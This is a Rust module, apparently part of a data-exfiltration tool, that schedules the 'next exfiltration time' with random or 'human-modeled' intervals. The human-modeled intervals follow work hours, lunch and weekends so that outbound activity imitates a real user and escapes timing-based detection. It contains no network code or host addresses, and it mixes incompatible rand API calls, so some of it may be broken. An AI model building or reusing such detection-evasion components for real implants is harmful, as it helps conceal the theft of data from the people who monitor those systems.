// Timing Randomization - Human-Like Patterns
// Mimics human activity patterns instead of fixed intervals

use std::sync::Arc;
use tokio::sync::Mutex;
use std::time::{Duration, SystemTime};
use rand::Rng;

#[derive(Clone, Copy)]
pub enum TimingModel {
    Uniform,        // Uniform random between min-max
    Normal,         // Normal distribution (mean, stddev)
    Pareto,         // Pareto distribution (long-tail)
    HumanModeled,   // Follows observed user activity patterns
}

pub struct TimingRandomizer {
    model: Arc<Mutex<TimingModel>>,
    base_interval: Duration,
    min_interval: Duration,
    max_interval: Duration,
    work_hours: (u8, u8), // (start_hour, end_hour) in 24h format
}

impl TimingRandomizer {
    pub fn new(base_interval: Duration) -> Self {
        Self {
            model: Arc::new(Mutex::new(TimingModel::HumanModeled)),
            base_interval,
            min_interval: base_interval / 2,
            max_interval: base_interval * 2,
            work_hours: (9, 17), // 9am-5pm
        }
    }
    
    /// Calculate next exfiltration time based on timing model
    pub async fn next_interval(&self) -> Duration {
        let model = self.model.lock().await.clone();
        let now = SystemTime::now();
        
        match model {
            TimingModel::Uniform => self.uniform_random(),
            TimingModel::Normal => self.normal_random(),
            TimingModel::Pareto => self.pareto_random(),
            TimingModel::HumanModeled => self.human_modeled(now).await,
        }
    }
    
    fn uniform_random(&self) -> Duration {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let min_secs = self.min_interval.as_secs();
        let max_secs = self.max_interval.as_secs();
        // Use random_range for rand 0.9 compatibility
        let secs = rng.random_range(min_secs..=max_secs);
        Duration::from_secs(secs)
    }
    
    fn normal_random(&self) -> Duration {
        use rand_distr::{Normal, Distribution};
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let mean = self.base_interval.as_secs() as f64;
        let stddev = mean * 0.3; // 30% standard deviation
        let normal = Normal::new(mean, stddev).unwrap();
        let secs = normal.sample(&mut rng).max(0.0) as u64;
        Duration::from_secs(secs)
    }
    
    fn pareto_random(&self) -> Duration {
        use rand_distr::{Pareto, Distribution};
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let pareto = Pareto::new(1.0, 2.0).unwrap();
        let multiplier = pareto.sample(&mut rng);
        let secs = (self.base_interval.as_secs() as f64 * multiplier) as u64;
        Duration::from_secs(secs.min(self.max_interval.as_secs()))
    }
    
    async fn human_modeled(&self, now: SystemTime) -> Duration {
        use chrono::{DateTime, Utc, Timelike, Datelike};
        
        let datetime: DateTime<Utc> = now.into();
        let hour = datetime.hour();
        let weekday = datetime.date_naive().weekday().num_days_from_monday() + 1; // 1=Monday, 7=Sunday
        
        // Model human activity patterns:
        // - Peak hours (9am-11am, 2pm-4pm): more frequent
        // - Lunch (12pm-1pm): less frequent
        // - After hours (5pm-9am): very infrequent
        // - Weekends: minimal activity
        
        let is_weekend = weekday > 5;
        let is_work_hours = hour >= self.work_hours.0 as u32 && hour < self.work_hours.1 as u32;
        let is_peak_hours = (hour >= 9 && hour < 11) || (hour >= 14 && hour < 16);
        let is_lunch = hour >= 12 && hour < 13;
        
        let base_secs = self.base_interval.as_secs();
        let multiplier = if is_weekend {
            3.0 // Weekends: 3x longer intervals
        } else if is_lunch {
            1.5 // Lunch: 1.5x longer
        } else if is_peak_hours {
            0.7 // Peak hours: 0.7x (more frequent)
        } else if is_work_hours {
            1.0 // Normal work hours
        } else {
            2.5 // After hours: 2.5x longer
        };
        
        let secs = (base_secs as f64 * multiplier) as u64;
        let mut rng = rand::thread_rng();
        let jitter = rng.gen_range(-0.2..=0.2); // ±20% jitter
        let final_secs = (secs as f64 * (1.0 + jitter)) as u64;
        
        Duration::from_secs(final_secs)
            .max(self.min_interval)
            .min(self.max_interval)
    }
    
    /// Set timing model
    pub async fn set_model(&self, model: TimingModel) {
        *self.model.lock().await = model;
    }
    
    /// Set work hours
    pub fn set_work_hours(&mut self, start: u8, end: u8) {
        self.work_hours = (start, end);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_uniform_random() {
        let randomizer = TimingRandomizer::new(Duration::from_secs(3600));
        let interval = randomizer.uniform_random();
        assert!(interval >= randomizer.min_interval);
        assert!(interval <= randomizer.max_interval);
    }
    
    #[tokio::test]
    async fn test_human_modeled() {
        let randomizer = TimingRandomizer::new(Duration::from_secs(3600));
        let interval = randomizer.next_interval().await;
        assert!(interval >= randomizer.min_interval);
        assert!(interval <= randomizer.max_interval);
    }
}

